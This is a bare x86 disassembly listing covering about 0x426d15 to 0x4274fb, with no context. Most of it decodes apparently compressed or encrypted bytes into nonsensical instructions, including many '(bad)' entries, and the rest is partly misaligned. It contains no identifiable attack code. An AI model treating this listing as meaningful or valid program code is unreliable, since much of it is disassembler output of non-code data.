  426d15:	lahf   
  426d16:	(bad)  
  426d17:	cmc    
  426d18:	repnz or eax,0xc1785113
  426d1e:	inc    ebp
  426d1f:	pop    edx
  426d20:	jle    0x426d75
  426d22:	cmp    BYTE PTR [ecx-0x1b84e04e],bh
  426d28:	jecxz  0x426d5c
  426d2a:	fwait
  426d2b:	cmc    
  426d2c:	(bad)  
  426d2d:	shl    BYTE PTR [ebx+edi*4],cl
  426d30:	mov    di,0x8231
  426d34:	sti    
  426d35:	lock dec edi
  426d37:	inc    ebx
  426d38:	jecxz  0x426d97
  426d3a:	mov    al,ds:0xa1fbc621
  426d3f:	add    BYTE PTR [ebx+0x14],cl
  426d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d43:	leave  
  426d44:	call   DWORD PTR [ebx]
  426d46:	cli    
  426d47:	ins    BYTE PTR es:[edi],dx
  426d48:	aam    0xec
  426d4a:	cmp    al,0x5b
  426d4c:	xor    ch,bl
  426d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d4f:	add    BYTE PTR [eax-0x60],dh
  426d52:	aad    0x64
  426d54:	sbb    BYTE PTR [edx+0x18fd85f3],ch
  426d5a:	loope  0x426d3e
  426d5c:	mov    es,WORD PTR [esi+0x49]
  426d5f:	cwde   
  426d60:	sbb    ebx,DWORD PTR [eax-0x74]
  426d63:	xchg   esp,eax
  426d64:	leave  
  426d65:	(bad)  
  426d66:	mov    ah,0x22
  426d68:	adc    DWORD PTR [eax-0x2d],0xa1fab42e
  426d6f:	addr16 retf 
  426d71:	bound  edx,QWORD PTR [ebx+0x51cc22b]
  426d77:	jbe    0x426de0
  426d79:	push   esp
  426d7a:	xchg   edx,eax
  426d7b:	push   edi
  426d7c:	xchg   ecx,eax
  426d7d:	or     DWORD PTR [ebx*8+0x3e1c212e],0x15
  426d85:	cmc    
  426d86:	sahf   
  426d87:	pop    ebx
  426d88:	das    
  426d89:	in     eax,dx
  426d8a:	xor    DWORD PTR [edx+0x71],esp
  426d8d:	sbb    cl,BYTE PTR [eax+0x25]
  426d90:	nop
  426d91:	sub    ah,bh
  426d93:	mov    ?,WORD PTR [eax]
  426d95:	mov    ebx,0xfe536d5a
  426d9a:	inc    esp
  426d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d9c:	add    BYTE PTR [eax+eax*4-0x4596b8f0],bh
  426da3:	and    DWORD PTR [esi],0x38
  426da6:	dec    ebp
  426da7:	dec    edi
  426da8:	inc    esp
  426da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426daa:	xchg   esp,eax
  426dab:	push   edi
  426dac:	aam    0xbb
  426dae:	or     DWORD PTR [eax+0x83e8a4f],ecx
  426db4:	xchg   DWORD PTR [edi+0x40],ebp
  426db7:	std    
  426db8:	lods   eax,DWORD PTR ds:[esi]
  426db9:	(bad)  
  426dba:	jg     0x426db6
  426dbc:	pop    edi
  426dbd:	in     al,dx
  426dbe:	cmp    esp,DWORD PTR [eax]
  426dc0:	call   0x6d5ea382
  426dc5:	dec    esp
  426dc6:	xchg   BYTE PTR [ebx],ah
  426dc8:	psrld  mm5,QWORD PTR [edx+0x3ae5d290]
  426dcf:	popa   
  426dd0:	sbb    dh,cl
  426dd2:	sub    esi,DWORD PTR [esi+0x10e73f1b]
  426dd8:	icebp  
  426dd9:	mov    esi,0x387a579c
  426dde:	inc    edi
  426ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426de0:	(bad)
  426de3:	jl     0x426dc4
  426de5:	dec    edi
  426de6:	xchg   edx,eax
  426de7:	sub    DWORD PTR [ebx-0x6496241b],edx
  426ded:	data16 lods al,BYTE PTR ds:[esi]
  426def:	mov    al,0x1d
  426df1:	or     eax,0x88c8fffc
  426df6:	es cld 
  426df8:	mov    ch,0xab
  426dfa:	mov    esp,0xebcead5e
  426dff:	xor    edx,DWORD PTR [edx-0x61]
  426e02:	cmp    BYTE PTR [ebp-0x4b],0x27
  426e06:	push   ds
  426e07:	jns    0x426e15
  426e09:	pop    edx
  426e0a:	jmp    0x1740e138
  426e0f:	out    dx,al
  426e10:	xchg   ecx,eax
  426e11:	test   BYTE PTR [ecx-0x30b65f34],bh
  426e17:	bound  ecx,QWORD PTR [esi-0x3e76e9d9]
  426e1d:	push   ebp
  426e1e:	test   DWORD PTR [ebp+0x1fd8c0c8],ecx
  426e24:	push   ebp
  426e25:	and    al,0x1a
  426e27:	jmp    0x9fc91066
  426e2c:	popf   
  426e2d:	lar    esp,WORD PTR [ebp+0x75226b89]
  426e34:	dec    ecx
  426e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e36:	aas    
  426e37:	pusha  
  426e38:	adc    dx,WORD PTR [eax+0x4cc4cf91]
  426e3f:	push   ebx
  426e40:	test   eax,0x4ba3abc6
  426e45:	push   eax
  426e46:	sub    BYTE PTR ds:0xd925f292,ah
  426e4c:	pop    esp
  426e4d:	push   esp
  426e4e:	fs mov bh,bh
  426e51:	in     al,dx
  426e52:	adc    esp,DWORD PTR [ebx+edi*8-0x77f0047e]
  426e59:	dec    eax
  426e5a:	jle    0x426e77
  426e5c:	loop   0x426e65
  426e5e:	inc    ecx
  426e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e60:	ins    BYTE PTR es:[edi],dx
  426e61:	sbb    eax,0x1917364b
  426e66:	les    ecx,FWORD PTR [ebx+eax*8]
  426e69:	cmp    eax,0xe84b144a
  426e6e:	in     eax,dx
  426e6f:	test   al,0x12
  426e71:	mov    ah,0x85
  426e73:	mov    cl,0xfa
  426e75:	push   edi
  426e76:	mov    dh,0xb0
  426e78:	ins    BYTE PTR es:[edi],dx
  426e79:	ins    BYTE PTR es:[edi],dx
  426e7a:	stos   DWORD PTR es:[edi],eax
  426e7b:	sbb    al,0x37
  426e7d:	in     al,0x8b
  426e7f:	xchg   esi,eax
  426e80:	mov    ecx,DWORD PTR [esi-0x5d]
  426e83:	sub    ah,ch
  426e85:	mov    dl,0x54
  426e87:	push   ss
  426e88:	mov    ebp,0xf20dba7c
  426e8d:	shr    BYTE PTR [edx+0x4],1
  426e90:	not    DWORD PTR [ebp-0x42147dc5]
  426e96:	sahf   
  426e97:	mov    esp,0xbb108156
  426e9c:	mov    dl,0x91
  426e9e:	(bad)  
  426e9f:	outs   dx,BYTE PTR ds:[esi]
  426ea0:	in     al,dx
  426ea1:	sbb    BYTE PTR [di-0x562f],bh
  426ea6:	or     BYTE PTR [ebx+ebp*8+0x362b7b79],ch
  426ead:	stos   DWORD PTR es:[edi],eax
  426eae:	add    ebp,ebx
  426eb0:	pop    ebp
  426eb1:	mov    ebp,0x171b2c37
  426eb6:	int3   
  426eb7:	mov    ds:0xac254ca0,al
  426ebc:	jbe    0x426ee8
  426ebe:	out    dx,eax
  426ebf:	mov    bl,0x56
  426ec1:	push   cx
  426ec3:	cmp    ch,BYTE PTR [eax+0x313bcadd]
  426ec9:	out    dx,eax
  426eca:	enter  0x880a,0x4e
  426ece:	(bad)  
  426ed0:	inc    edi
  426ed1:	pop    esp
  426ed2:	ffreep st(6)
  426ed4:	scas   eax,DWORD PTR es:[edi]
  426ed5:	bound  ecx,QWORD PTR [ebx+0x4]
  426ed8:	and    BYTE PTR [ebx+esi*4-0x74],al
  426edc:	leave  
  426edd:	cmp    bl,dl
  426edf:	ficomp WORD PTR [ebx+0x29]
  426ee2:	mov    bl,0xa7
  426ee4:	sbb    DWORD PTR [ebx],eax
  426ee6:	sub    eax,0x5ed8195e
  426eeb:	out    0x3c,eax
  426eed:	sub    BYTE PTR [edx+ebx*2+0x44],bl
  426ef1:	imul   BYTE PTR [ebx+0x16dde867]
  426ef7:	lahf   
  426ef8:	ret    0xbef0
  426efb:	imul   BYTE PTR [esi-0x6e]
  426efe:	pop    ebp
  426eff:	in     eax,dx
  426f00:	or     DWORD PTR [edi-0x15979eed],edx
  426f06:	lahf   
  426f07:	and    al,0xc4
  426f09:	sbb    al,0xb9
  426f0b:	xchg   ebp,eax
  426f0c:	push   ecx
  426f0d:	test   eax,0x27558c29
  426f12:	test   eax,0xe7dee893
  426f17:	arpl   WORD PTR [ebx+0x7ea47a58],di
  426f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f1e:	or     bh,bl
  426f20:	ins    DWORD PTR es:[edi],dx
  426f21:	ret    0x20ea
  426f24:	out    0x1c,al
  426f26:	push   ebx
  426f27:	pop    eax
  426f28:	in     al,dx
  426f29:	add    BYTE PTR [edi+0x213a4cbc],0x8c
  426f30:	and    BYTE PTR [ecx-0x3c],ch
  426f33:	dec    esi
  426f34:	es popa 
  426f36:	or     dl,BYTE PTR [edi-0x71]
  426f39:	ja     0x426f1e
  426f3b:	mov    ebx,0x8afb2cd9
  426f40:	mov    al,0x88
  426f42:	bound  esp,QWORD PTR [edx+0x70465c5]
  426f48:	adc    esp,ebx
  426f4a:	pop    esp
  426f4b:	mov    bh,0x5e
  426f4d:	xchg   edx,eax
  426f4e:	lock test eax,0xbcfd19ae
  426f54:	push   esp
  426f55:	mov    eax,DWORD PTR [ecx+0x1a]
  426f58:	push   0x0
  426f5a:	cmp    ecx,DWORD PTR [edi-0x78]
  426f5d:	sub    DWORD PTR [edx],edx
  426f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f60:	inc    edi
  426f61:	sub    BYTE PTR [edi],cl
  426f63:	push   ecx
  426f64:	je     0x426fa0
  426f66:	xchg   esi,eax
  426f67:	xor    BYTE PTR [ecx],ch
  426f69:	xor    cl,ah
  426f6b:	add    ch,BYTE PTR [esi]
  426f6d:	mov    edi,0x55ad7bc6
  426f72:	ret    
  426f73:	adc    BYTE PTR [ecx-0x3279c6e0],0xa1
  426f7a:	rcl    DWORD PTR [esi+ecx*2+0x64],cl
  426f7e:	push   cs
  426f7f:	stos   BYTE PTR es:[edi],al
  426f80:	sub    ecx,DWORD PTR [esi]
  426f82:	cmp    al,0xbb
  426f84:	sub    al,0xec
  426f86:	adc    bl,BYTE PTR [eax-0x3f5026f5]
  426f8c:	ret    0x91bb
  426f8f:	jl     0x426fff
  426f91:	call   0x2918:0x2a404fb3
  426f98:	test   DWORD PTR [edx-0x27a5896a],ebx
  426f9e:	adc    DWORD PTR [ebx-0x1897bed7],eax
  426fa4:	jmp    0x7d7ffdb7
  426fa9:	push   0x4d0f5846
  426fae:	inc    edi
  426faf:	(bad)  ds:[ebp-0x27]
  426fb3:	adc    BYTE PTR [ebx],al
  426fb5:	jg     0x426fc9
  426fb7:	or     al,0x81
  426fb9:	jae    0x426f65
  426fbb:	jmp    0x882d:0x93e25b66
  426fc2:	push   eax
  426fc3:	mov    dh,0xab
  426fc5:	retf   0x5118
  426fc8:	or     DWORD PTR [esi],esi
  426fca:	mov    esi,0xa7539ad
  426fcf:	jo     0x426f95
  426fd1:	jae    0x426feb
  426fd3:	dec    ebx
  426fd4:	arpl   WORD PTR [eax+0x5a],ax
  426fd7:	iret   
  426fd8:	inc    eax
  426fd9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426fdb:	std    
  426fdc:	aam    0x6a
  426fde:	mov    ebp,0xc0d9d4b8
  426fe3:	inc    ebp
  426fe4:	rcr    DWORD PTR [eax+0x13f4e934],0x8f
  426feb:	push   esp
  426fec:	add    al,0xb5
  426fee:	lea    edx,[ebp-0x5f]
  426ff1:	dec    esp
  426ff2:	xor    eax,0x5ca2c929
  426ff7:	inc    DWORD PTR [esi-0x4a]
  426ffa:	sub    al,0x10
  426ffc:	cli    
  426ffd:	shld   ebx,ebx,cl
  427000:	mov    edx,0xdee1ca0e
  427005:	cdq    
  427006:	mov    BYTE PTR [ecx],al
  427008:	adc    al,0x8d
  42700a:	outs   dx,BYTE PTR es:[esi]
  42700c:	ret    0x69e6
  42700f:	and    dl,ah
  427011:	rcl    ah,1
  427013:	ror    BYTE PTR [eax+ebx*2-0x1bac8a51],0x55
  42701b:	push   ebx
  42701c:	dec    eax
  42701d:	mov    ecx,0x48fa88d1
  427022:	mov    bl,0x7
  427024:	sub    ch,ah
  427026:	in     eax,0x40
  427028:	cld    
  427029:	xchg   edx,eax
  42702a:	push   ds
  42702b:	inc    ebp
  42702c:	enter  0xd70b,0x8d
  427030:	add    BYTE PTR [edi+0x16],bh
  427033:	sti    
  427034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427035:	das    
  427036:	jb     0x42705a
  427038:	addr16 pop sp
  42703b:	push   ds
  42703c:	lds    esi,FWORD PTR [edi+0x61]
  42703f:	fsubr  DWORD PTR [edx+0x31bed49c]
  427045:	data16 mov al,ds:0xedb86481
  42704b:	sub    al,0x4c
  42704d:	iret   
  42704e:	popa   
  42704f:	mov    WORD PTR [eax-0x607db54],fs
  427055:	adc    ebp,esp
  427057:	sub    ah,dh
  427059:	mov    al,0x16
  42705b:	push   esi
  42705c:	mov    DWORD PTR [ecx-0x6ba71861],eax
  427062:	stos   BYTE PTR es:[edi],al
  427063:	popf   
  427064:	(bad)  
  427065:	inc    edx
  427066:	daa    
  427067:	out    0x70,al
  427069:	and    esi,esp
  42706b:	sbb    ch,BYTE PTR [ecx]
  42706d:	push   ss
  42706e:	pop    ecx
  42706f:	ret    
  427070:	lea    ebx,[ebx+0x1958022c]
  427076:	lods   eax,DWORD PTR ds:[esi]
  427077:	push   cs
  427078:	sahf   
  427079:	rol    BYTE PTR [eax+ebp*4+0x42],0xfa
  42707e:	je     0x427064
  427080:	sub    BYTE PTR [eax-0x7],cl
  427083:	out    0x85,al
  427085:	sti    
  427086:	fwait
  427087:	xor    al,0xda
  427089:	psllw  mm7,0xa9
  42708d:	js     0x42709c
  42708f:	jns    0x42708a
  427091:	lods   al,BYTE PTR ds:[esi]
  427092:	dec    edi
  427093:	mov    ebp,0x6d070f8e
  427098:	popf   
  427099:	xchg   bl,bl
  42709b:	sbb    al,BYTE PTR [edx+0x63]
  42709e:	fs push ebp
  4270a0:	mov    esi,0x2214bea5
  4270a5:	(bad)  
  4270a6:	mov    ebx,0x9518f3d9
  4270ab:	int3   
  4270ac:	int    0x75
  4270ae:	jge    0x427031
  4270b0:	jnp    0x4270cc
  4270b2:	inc    ecx
  4270b3:	fwait
  4270b4:	xchg   esp,eax
  4270b5:	and    al,0xd7
  4270b7:	xor    BYTE PTR [edi],ch
  4270b9:	jae    0x42707d
  4270bb:	out    0xd6,al
  4270bd:	mov    ?,WORD PTR [edx+0x16]
  4270c0:	jmp    0x6c0:0x190eaf43
  4270c7:	in     eax,dx
  4270c8:	repnz cmova ebx,edx
  4270cc:	scas   al,BYTE PTR es:[edi]
  4270cd:	sahf   
  4270ce:	popa   
  4270cf:	repnz mov esi,0x89e21f51
  4270d5:	and    DWORD PTR [edx+0x29],ecx
  4270d8:	pop    esi
  4270d9:	adc    eax,0x8b6889d2
  4270de:	cmp    al,0xc9
  4270e0:	ss lahf 
  4270e2:	imul   eax,DWORD PTR [edx-0x49],0x5bc6b6cf
  4270e9:	dec    edx
  4270ea:	sub    ebx,DWORD PTR [ecx]
  4270ec:	mov    cl,0xef
  4270ee:	ret    
  4270ef:	xor    al,0x5c
  4270f1:	mov    cl,0xaa
  4270f3:	jae    0x427108
  4270f5:	xor    DWORD PTR [ebx+0x27],0xffffff88
  4270f9:	sub    al,0x96
  4270fb:	xor    BYTE PTR [esi+0x75563362],dl
  427101:	pushf  
  427102:	imul   esp,DWORD PTR [eax-0x4b25c14],0xffffffbf
  427109:	mov    ecx,0x90f2c78b
  42710e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42710f:	and    ecx,DWORD PTR [esi-0x79]
  427112:	inc    eax
  427113:	gs inc eax
  427115:	pushf  
  427116:	shl    DWORD PTR [esi+0x64acacd1],cl
  42711c:	ins    DWORD PTR es:[edi],dx
  42711d:	ds pusha 
  42711f:	lods   al,BYTE PTR ds:[esi]
  427120:	jno    0x4270c9
  427122:	aas    
  427123:	loope  0x427158
  427125:	int3   
  427126:	xlat   BYTE PTR ds:[ebx]
  427127:	cmc    
  427128:	lds    esp,FWORD PTR [ebx+0x21]
  42712b:	and    eax,0x54fb07c0
  427130:	ss jae 0x4270d3
  427133:	and    eax,0x200c8dd6
  427138:	gs hlt 
  42713a:	mov    ecx,0xce1259f7
  42713f:	inc    edi
  427140:	mov    dl,0x64
  427142:	adc    al,0x60
  427144:	loop   0x427149
  427146:	add    eax,0x2dc51887
  42714b:	cmp    dl,bh
  42714d:	sbb    ch,bl
  42714f:	retf   0xc27
  427152:	(bad)  
  427154:	ret    
  427155:	mul    edx
  427157:	push   edx
  427158:	add    al,0x7a
  42715a:	pushf  
  42715b:	je     0x42717c
  42715d:	pop    ss
  42715e:	call   0x68510c78
  427163:	retf   0x5be9
  427166:	sbb    eax,0x20b4e1fa
  42716b:	push   esp
  42716c:	icebp  
  42716d:	test   DWORD PTR [eax-0x2ae3eb7a],edx
  427173:	stc    
  427174:	repz push esi
  427176:	test   eax,0xd8d34ca7
  42717b:	stos   BYTE PTR es:[edi],al
  42717c:	es stc 
  42717e:	je     0x42716e
  427180:	adc    eax,0x93df3812
  427185:	mov    ch,0xb7
  427187:	dec    BYTE PTR [ebx]
  427189:	das    
  42718a:	mov    ah,0x14
  42718c:	ins    BYTE PTR es:[edi],dx
  42718d:	hlt    
  42718e:	jae    0x427198
  427190:	aaa    
  427191:	xchg   edx,eax
  427192:	xor    DWORD PTR [edi+0x39],edx
  427195:	add    ecx,DWORD PTR [ecx+0x48]
  427198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427199:	inc    ebp
  42719a:	adc    BYTE PTR [eax],bh
  42719c:	clc    
  42719d:	pushf  
  42719e:	cmp    dl,dl
  4271a0:	push   edx
  4271a1:	test   BYTE PTR [esp+edi*2],ah
  4271a4:	xchg   BYTE PTR cs:[edx-0x1a],ah
  4271a8:	gs jmp 0xf628:0x59a75a9e
  4271b0:	pop    esp
  4271b1:	jbe    0x427164
  4271b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271b4:	or     eax,0x73f833f7
  4271b9:	mov    bh,0x36
  4271bb:	push   ebp
  4271bc:	sub    ch,al
  4271be:	daa    
  4271bf:	push   cs
  4271c0:	shl    BYTE PTR [esi-0x738bb96],cl
  4271c6:	out    0x93,al
  4271c8:	jbe    0x42717b
  4271ca:	xchg   ebp,eax
  4271cb:	lahf   
  4271cc:	jns    0x42716b
  4271ce:	sub    al,ch
  4271d0:	in     eax,dx
  4271d1:	add    al,0x26
  4271d3:	mov    ebx,0x38e67865
  4271d8:	std    
  4271d9:	cmp    ch,BYTE PTR [eax-0x3d]
  4271dc:	aad    0x9a
  4271de:	inc    ebp
  4271df:	mov    ebx,0xdf69d291
  4271e4:	cdq    
  4271e5:	imul   ecx,edi,0x359cf9c3
  4271eb:	aas    
  4271ec:	mov    dl,BYTE PTR [ecx]
  4271ee:	inc    ecx
  4271ef:	dec    edi
  4271f0:	dec    edx
  4271f1:	inc    ebx
  4271f2:	cmp    eax,DWORD PTR [esi+0x31585b73]
  4271f8:	cmp    eax,0x7ecc96a5
  4271fd:	push   edi
  4271fe:	and    al,0xae
  427200:	cmp    DWORD PTR [ecx-0x48],0x35c3a72a
  427207:	test   al,0x8f
  427209:	loop   0x427208
  42720b:	pusha  
  42720c:	sti    
  42720d:	sub    al,0x50
  42720f:	gs in  al,dx
  427211:	ror    BYTE PTR [ebx+ebx*4+0x43],1
  427215:	js     0x42721c
  427217:	push   ecx
  427218:	mov    ah,0x5e
  42721a:	mov    eax,0xea1efb57
	...
  427227:	add    BYTE PTR [eax],al
  427229:	add    BYTE PTR [ebp+0x55],cl
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
